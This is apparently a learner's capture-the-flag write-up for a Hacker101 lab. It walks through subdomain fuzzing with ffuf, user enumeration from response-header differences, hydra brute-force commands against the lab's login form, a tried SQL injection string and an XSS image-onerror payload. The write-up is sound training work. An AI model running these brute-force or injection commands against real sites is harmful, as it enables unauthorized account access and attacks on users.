

Flag2


I had to start to fuzz the site trying to watch some subdomains on the site.
ffuf -c -w /usr/share/amass/wordlists/subdomains-top1mil-20000.txt -u https://be4a316f2803e92c5d9c0da273868cb0.ctf.hacker101.com/FUZZ


![[Screenshot_2023-09-19_10_34_40.png]]


We have a /login panel 

![[Screenshot_2023-09-19_10_38_18.png]]

I was trying with admin, administrator,  ' or 1=1 -- -

With zap proxy  Im trying to guess if there is a valid user 
![[Screenshot_2023-09-19_14_04_34.png]]

I only can see a difference on the size of the response headers some  of them , a little bit of them have 288 bytes and the others 233 bytes, this can be an indicator of  valid users. 

The difference on the header its on the connection header one says "close" and another says "keep-alive"

```
228

HTTP/1.1 200 OK  
Date: Tue, 19 Sep 2023 17:22:22 GMT  
Content-Type: text/html; charset=utf-8  
Content-Length: 378  
Connection: close  
Server: openresty/1.21.4.2  
Cache-Control: public, max-age=0  
Pragma: no-cache  
Expires: 0



233

HTTP/1.1 200 OK  
Date: Tue, 19 Sep 2023 18:20:02 GMT  
Content-Type: text/html; charset=utf-8  
Content-Length: 378  
Connection: keep-alive  
Server: openresty/1.21.4.2  
Cache-Control: public, max-age=0  
Pragma: no-cache  
Expires: 0

```



If you dont know how to do a bruteforce attack with zap here you have a guide, you must change the payload instead of passwords , put users. 

https://www.zaproxy.org/blog/2022-03-29-portswigger-lab-brute-force-password-change/

and here you have a list of usernames

https://gist.github.com/kivox/920c271ef8dec2b33c84e1f2cc2977fc


While I do this im trying with different users and passwords , in the real world this is impossible, even the attack trying to see if there is a possible user, you wont be able to try more than 3 or maybe 10 times , but I think there it is possible that yet exist some very unsecure sites.

```
hydra -L /home/cds/zapusers.txt  -P /home/cds/Downloads/wordlists/10k-most-common.txt 02a26dedb4d1c666091a8f79b98a65db.ctf.hacker101.com/login  https-post-form '/login:username=^USER^&password=^PASS^&Login=Login:Invalid username'
```
I made my own word list of the users that i found and im using another with the 10.000 most common passwords


I was using a lot of time brute force attacks with zap but it doesnt work. So I change the way to do this, first I downloaded a list of users. Then I did a brute force attack to the users.

```
hydra -L /home/cds/Downloads/wordlists/names.txt -p peperoni  0fedeabc10447f905116c52341b23b91.ctf.hacker101.com  https-post-form '/login:username=^USER^&password=^PASS^&Login=Login:Invalid username' -vv
```

![[Screenshot_2023-09-21_21_21_55.png]]



When I find the user I tied to find a password with rockyou.txt
```
┌──(cds㉿kali)-[~]
└─$ hydra -l moyra -P /usr/share/wordlists/rockyou.txt  0fedeabc10447f905116c52341b23b91.ctf.hacker101.com  https-post-form '/login:username=^USER^&password=^PASS^&Login=Login:Invalid password' -vv 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

```

And I did it !!


![[Screenshot_2023-09-21_21_22_02.png]]

Flag 2

Sometimes the most obvious thing is the first that you must do. In this case the vulnerability is on a XSS on the inputs of the website. First you need to log in with the credentials that you retrieve.

Then you must put something like this on the inputs that you can edit. 
```
<img src=x onerror=alert(1)>Puppy 8"x10" color glossy photograph of a puppy.|
```

You don't will be able to put it on the price input because it only accepts numbers.
Once you have did it you can put the item on the cart and then when you see the cart you will be able to see the flag
